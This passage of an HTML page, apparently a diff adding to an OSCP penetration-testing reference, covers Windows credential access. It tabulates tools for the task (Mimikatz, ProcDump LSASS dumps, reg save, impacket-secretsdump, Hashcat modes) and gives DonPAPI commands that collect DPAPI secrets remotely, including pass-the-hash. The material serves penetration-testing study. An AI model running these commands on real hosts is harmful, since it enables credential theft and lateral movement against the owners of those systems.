authorized context or DPAPI chain</td></tr><tr><td>DPAPI blob cannot decrypt</td><td>Missing master key/protecting context/material</td><td>Map blob → GUID → protect scope → key</td></tr><tr><td>Remote <code>secretsdump</code> denied</td><td>Remote admin/registry/replication prerequisite absent</td><td>Stop broad retries; determine which source/right was actually expected</td></tr><tr><td>DRS request denied</td><td>Effective domain-root replication rights absent</td><td>Validate the exact ACEs; local admin is irrelevant</td></tr></tbody></table>
+<h2 id="tooling-for-this-section">Tooling for this section</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tool</th><th>Choose it when</th><th>Requirements</th><th>Baseline</th><th>Decisive output</th><th>Failure cue</th></tr></thead><tbody><tr><td><code>klist</code></td><td>Current Windows ticket inventory</td><td>Windows logon session; elevation for some LUIDs</td><td><code>klist</code></td><td>Client, server/SPN, validity and cache</td><td>Empty cache or inaccessible LUID</td></tr><tr><td>Mimikatz</td><td>Source/rights justify live or offline credential parsing</td><td>Trusted compatible build; appropriate privilege</td><td><code>privilege::debug</code>, selected <code>sekurlsa</code>/<code>lsadump</code> command</td><td>Typed secret tied to identity/logon</td><td>PPL/CG/EDR, architecture or token failure</td></tr><tr><td>ProcDump/<code>comsvcs.dll</code></td><td>Authorized LSASS dump for offline analysis</td><td>Elevated process access; writable destination</td><td>Section 4</td><td>Complete dump file</td><td>Access denied/blocking/partial dump</td></tr><tr><td><code>reg save</code></td><td>Matched local registry hives</td><td>Administrator/SYSTEM or backup-capable context</td><td>Sections 5–6</td><td>Successful hive exports</td><td>Access denied or mismatched point-in-time files</td></tr><tr><td><code>impacket-secretsdump</code></td><td>Parse matched hives or use a validated remote/DRS path</td><td>Installed version, selected source and its privilege</td><td><code>-sam/-system LOCAL</code> or narrow DRS request</td><td>Correctly typed rows</td><td>Boot-key mismatch, remote-right or DRS failure</td></tr><tr><td><code>cmdkey</code>/<code>vaultcmd</code></td><td>Locate saved credential targets/types</td><td>Current user context</td><td><code>cmdkey /list</code></td><td>Target/type/user clues</td><td>Listed entry without exportable secret</td></tr><tr><td>Hashcat</td><td>Offline guessing of a classified verifier</td><td>Correct mode, candidate list/rule and compute</td><td><code>-m 2100</code> for DCC2, <code>-m 1000</code> for NTLM</td><td>Recovered candidate verified against artifact</td><td>Token-length/format/mode mismatch</td></tr></tbody></table>
+<h2 id="donpapi--remote-dpapiapplication-secret-collection-with-host-rights">DonPAPI — remote DPAPI/application-secret collection with host rights</h2>
+<p>Use after confirming the accepted identity has the required administrative/remote access on this Windows host. SMB, remote operations and the available masterkey material affect what can be decrypted; ordinary domain-user authentication is not enough.</p>
+<pre><code class="language-bash"># One named host and one relevant collector, not automatic whole-domain targeting
+donpapi collect -d DOMAIN -u USER -p 'PASSWORD' -t TARGET -c CredMan
+
+# Distinct authentication material: the tool expects LMHASH:NTHASH form
+donpapi collect -d DOMAIN -u USER \
+  -H 'aad3b435b51404eeaad3b435b51404ee:HASH' -t TARGET -c CredMan
+</code></pre>
+<p>Read: distinguish acquired encrypted artifacts from decrypted credentials and identify each artifact's profile/application. Remote Registry/SAM/LSA operations can require service-control rights and alter service state. Bring the relevant password/hash/masterkey/PVK when needed; <code>--fetch-pvk</code> is not a default action and requires additional domain rights. An empty result can be a collection or decryption failure. Validate a recovered identity before moving.</p>
+<p>Sources: <a href="https://github.com/login-securite/DonPAPI">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 23, especially pp758–767 and pp779–784.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Windows authentication credential processes</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">Microsoft LSA protection</a></li>
+<li><a href="https://learn.microsoft.com/windows/security/identity-protection/credential-guard/">Microsoft Credential Guard</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa">Mimikatz <code>sekurlsa</code></a> and <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump"><code>lsadump</code></a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">Impacket <code>secretsdump</code></a></li>
+<li><a href="https://learn.microsoft.com/sysinternals/downloads/procdump">Microsoft PsTools/ProcDump</a></li>
+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory">Hexdump Active Directory module</a>. The live module was still a TODO when checked; no credential-access procedure was imported from it.</li>
+</ul></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
